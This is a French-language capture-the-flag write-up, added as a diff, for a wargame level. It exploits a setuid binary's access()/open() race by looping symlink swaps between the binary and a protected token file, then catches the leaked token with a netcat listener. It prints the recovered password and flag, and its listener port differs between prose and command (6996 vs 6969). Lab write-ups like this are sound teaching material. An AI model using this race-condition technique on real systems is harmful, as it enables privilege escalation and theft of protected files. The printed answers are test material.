@@ -1,0 +1,69 @@
+>ls
+    level10 token
+
+>ls -la
+    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+>./level10
+./level10 file host
+	sends file to host if you have access to it
+
+>./level10 token 127.0.0.1
+    You don't have access to token
+
+>ln -s /home/user/level10/token /tmp/link
+    lrwxrwxrwx 1 level10 level10 24 Apr 10 13:45 /tmp/link -> /home/user/level10/token
+
+>./level10 /tmp/link 127.0.0.1
+    You don't have access to /tmp/link
+
+Meme en creant un link vers le token, nous n'avons pas le droit de l'utiliser
+
+>scp -P 4242 level10@192.168.56.101:/home/user/level10/level10 . 
+
+En recuperant le level10, on peut utiliser gidrah pour voir ce qu'il contient et en regardant, on voit un access et un open
+
+En regardant le man de ces 2 fonctions, on peut voir ca dans access :
+>man 2 access
+    [...]
+    Warning: Using access() to check if a user is authorized to, for  exam‐
+           ple, open a file before actually doing so using open(2) creates a secu‐
+           rity hole, because the user  might  exploit  the  short  time  interval
+           between  checking and opening the file to manipulate it.
+    [...]
+
+Donc ca nous apprends que nous pouvons utiliser cette " faille " pour ouvrir le token en faisant un sim-link de level10, puis directement apres un sim-link de token
+
+Donc dans /tmp/ :
+
+Ici on creer une boucle infini qui va creer des sim-link de level10/token pour utiliser la " faille "
+>nano script.sh
+    >while true;
+    >do
+    >        ln -fs /home/user/level10/level10 /tmp/link;
+    >        ln -fs /home/user/level10/token /tmp/link;
+    >done
+
+
+Ensuite il faut que l'on fasse une autre boucle infini pour utiliser level10 sur le /tmp/link
+>nano script2.sh
+    >while true;
+    >do 
+    >        ./../home/user/level10/level10 /tmp/link 127.0.0.1
+    >done
+
+>chmod 777 script.sh script2.sh
+
+Et pour finir, il faut lancer un avant de lancer les 2 scripts sur 2 differents terminals : nc -lk 6996 ( car c'est sur ce port ci que le resultat va sortir, on peut le voir dans le level10 via gidrah )
+
+>nc -lk 6969
+    [...]
+    woupa2yuojeeaaed06riuj63c
+    [...]
+
+>su flag10
+    >woupa2yuojeeaaed06riuj63c
+
+>getflag
+    ffeulo4b72j7edeahuete3no7c
